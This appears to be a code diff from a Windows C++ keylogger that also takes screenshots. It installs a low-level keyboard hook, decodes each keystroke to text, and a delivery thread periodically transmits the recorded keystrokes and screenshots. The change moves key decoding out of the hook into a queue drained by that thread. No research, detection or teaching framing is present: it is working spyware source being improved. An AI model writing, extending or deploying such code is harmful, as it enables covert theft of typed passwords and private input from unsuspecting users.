@@ -11,11 +11,24 @@
 
 
 
-int jpegCompressionValue = 25;
+int jpegCompressionValue = 50;
 enum messageTypes{keystrokes = 0, screenshot} mType;
 
+
+struct RawKeyEvent
+{
+    DWORD vkCode;
+    DWORD scanCode;
+    bool  isExtended;
+    bool  shift;
+    bool  ctrl;
+    bool  alt;
+    bool  capsLock;
+};
+
+
 HHOOK hHook = NULL;
-bool capsLock = false;
+//bool capsLock = false;
 
 std::string recordedKeystrokes = "";
 std::string capturedScreenshot = "";
@@ -23,6 +36,13 @@ std::string capturedScreenshot = "";
 
 std::mutex capturedScreenshotMutex;
 std::mutex recordedKeystrokesMutex;
+
+
+std::mutex rawKeystrokesQueueMutex;
+std::vector<RawKeyEvent> rawKeystrokesQueue;
+
+
+
 
 
 std::string convertUnsignedCharVectorToString(std::vector<unsigned char> vector)
@@ -82,6 +102,64 @@ void clearRecordedKeystrokes()
     std::unique_lock<std::mutex> lock(recordedKeystrokesMutex);
     recordedKeystrokes = "";
 }
+
+
+
+
+
+inline void enqueueRawKey(const RawKeyEvent& ev) {
+    std::unique_lock<std::mutex> lock(rawKeystrokesQueueMutex);
+    rawKeystrokesQueue.push_back(ev);
+}
+
+std::vector<RawKeyEvent> drainRawKeystrokesQueue() {
+    std::vector<RawKeyEvent> out;
+    std::unique_lock<std::mutex> lock(rawKeystrokesQueueMutex);
+    out.swap(rawKeystrokesQueue);
+    return out;
+}
+
+
+void processRawKey(const RawKeyEvent& ev) {
+    if (ev.vkCode == VK_BACK) {
+        saveToRecordedKeystrokes("[Backspace]");
+        return;
+    }
+    if (ev.vkCode == VK_RETURN) {
+        saveToRecordedKeystrokes("[Return]");
+        return;
+    }
+
+    BYTE lpKeyState[256] = { 0 };
+
+    if (ev.shift)    lpKeyState[VK_SHIFT]   = 0x80;
+    if (ev.ctrl)     lpKeyState[VK_CONTROL] = 0x80;
+    if (ev.alt)      lpKeyState[VK_MENU]    = 0x80;
+    if (ev.capsLock) lpKeyState[VK_CAPITAL] = 0x01;
+
+    if (ev.vkCode == VK_SHIFT)   lpKeyState[VK_SHIFT]   |= 0x80;
+    if (ev.vkCode == VK_CONTROL) lpKeyState[VK_CONTROL] |= 0x80;
+    if (ev.vkCode == VK_MENU)    lpKeyState[VK_MENU]    |= 0x80;
+
+    wchar_t wbuffer[64] = { 0 };
+
+    int result = ToUnicodeEx(
+        ev.vkCode, ev.scanCode, lpKeyState,
+        wbuffer, (int)(sizeof(wbuffer) / sizeof(wbuffer[0])),
+        ev.isExtended ? 1 : 0,
+        GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
+
+    if (result > 0) {
+        char buffer[64] = { 0 };
+        WideCharToMultiByte(CP_UTF8, 0, wbuffer, result,
+                            buffer, sizeof(buffer) / sizeof(char), NULL, NULL);
+        saveToRecordedKeystrokes(buffer);
+    }
+}
+
+
+
+
 
 
 
@@ -242,7 +320,13 @@ void deliveryThread(DataTransmission &dt,int interval_seconds)
         Sleep(interval_seconds);
 
 
+        // Process everything the hook has queued up
+        const std::vector<RawKeyEvent> keyEvents = drainRawKeystrokesQueue();
+        for (const RawKeyEvent& keyEvent : keyEvents)
+        {
 
+            processRawKey(keyEvent);
+        }
 
         mType = keystrokes;
 
@@ -268,101 +352,23 @@ void deliveryThread(DataTransmission &dt,int interval_seconds)
 
 
 
-LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam) {
-    if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
-    {
-        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
-        DWORD wVirtKey = kbdStruct->vkCode;
-        DWORD wScanCode = kbdStruct->scanCode;
+LRESULT CALLBACK keyboard_hook(const int code, const WPARAM wParam, const LPARAM lParam)
+{
+    if (code >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
 
-        BYTE lpKeyState[256];
-        GetKeyboardState(lpKeyState);
+        RawKeyEvent ev;
+        ev.vkCode     = kbd->vkCode;
+        ev.scanCode   = kbd->scanCode;
+        ev.isExtended = (kbd->flags & LLKHF_EXTENDED) != 0;
 
+        ev.shift    = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
+        ev.ctrl     = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+        ev.alt      = (GetAsyncKeyState(VK_MENU)    & 0x8000) != 0;
+        ev.capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
 
-        if (wVirtKey == VK_BACK)
-        {
-            saveToRecordedKeystrokes("[Backspace]");
-            //recordedKeystrokes += "[Backspace]";
-            return CallNextHookEx(hHook, code, wParam, lParam);
-        }
-        else if(wVirtKey == VK_RETURN)
-        {
-            saveToRecordedKeystrokes("[Return]");
-            //recordedKeystrokes += "[Return]";
-            return CallNextHookEx(hHook, code, wParam, lParam);
-        }
-
-
-        if (wVirtKey == VK_CAPITAL)
-        {
-            capsLock = !capsLock;
-        }
-
-        lpKeyState[VK_CAPITAL] = capsLock ? 0x01 : 0x00;
-
-
-        // Shift
-        if (GetAsyncKeyState(VK_LSHIFT) & 0x8000)
-            lpKeyState[VK_LSHIFT] = 0x80;
-
-        if (GetAsyncKeyState(VK_RSHIFT) & 0x8000)
-            lpKeyState[VK_RSHIFT] = 0x80;
-
-        if ((GetAsyncKeyState(VK_LSHIFT) & 0x8000) ||
-            (GetAsyncKeyState(VK_RSHIFT) & 0x8000))
-        {
-            lpKeyState[VK_SHIFT] = 0x80;
-        }
-
-        // Ctrl
-        if (GetAsyncKeyState(VK_LCONTROL) & 0x8000)
-            lpKeyState[VK_LCONTROL] = 0x80;
-
-        if (GetAsyncKeyState(VK_RCONTROL) & 0x8000)
-            lpKeyState[VK_RCONTROL] = 0x80;
-
-        if ((GetAsyncKeyState(VK_LCONTROL) & 0x8000) ||
-            (GetAsyncKeyState(VK_RCONTROL) & 0x8000))
-        {
-            lpKeyState[VK_CONTROL] = 0x80;
-        }
-
-        // Alt / AltGr
-        if (GetAsyncKeyState(VK_LMENU) & 0x8000)
-            lpKeyState[VK_LMENU] = 0x80;
-
-        if (GetAsyncKeyState(VK_RMENU) & 0x8000)
-            lpKeyState[VK_RMENU] = 0x80;
-
-        if ((GetAsyncKeyState(VK_LMENU) & 0x8000) ||
-            (GetAsyncKeyState(VK_RMENU) & 0x8000))
-        {
-            lpKeyState[VK_MENU] = 0x80;
-        }
-
-
-
-
-        wchar_t wbuffer[64] = { 0 };
-
-
-        int result = ToUnicodeEx(wVirtKey,wScanCode,lpKeyState,wbuffer,sizeof(wbuffer)/sizeof(wbuffer[0]),0,GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
-
-
-        if (result > 0)
-        {
-            char buffer[64] = { 0 };
-            WideCharToMultiByte(CP_UTF8, 0, wbuffer, result, buffer, sizeof(buffer) / sizeof(char), NULL, NULL);
-
-            saveToRecordedKeystrokes(buffer);
-            //recordedKeystrokes += buffer;
-            //std::cout << recordedKeystrokes << std::endl;
-            //sendGetRequest("http://echo.free.beeceptor.com");
-        }
-
-
+        enqueueRawKey(ev);
     }
-
     return CallNextHookEx(hHook, code, wParam, lParam);
 }
 
@@ -422,7 +428,7 @@ int main()
 
 
 
-    capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
+    //capsLock = (GetKeyState(VK_CAPITAL) & 1) != 0;
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_hook, NULL, 0);
     if (hHook == NULL)
     {
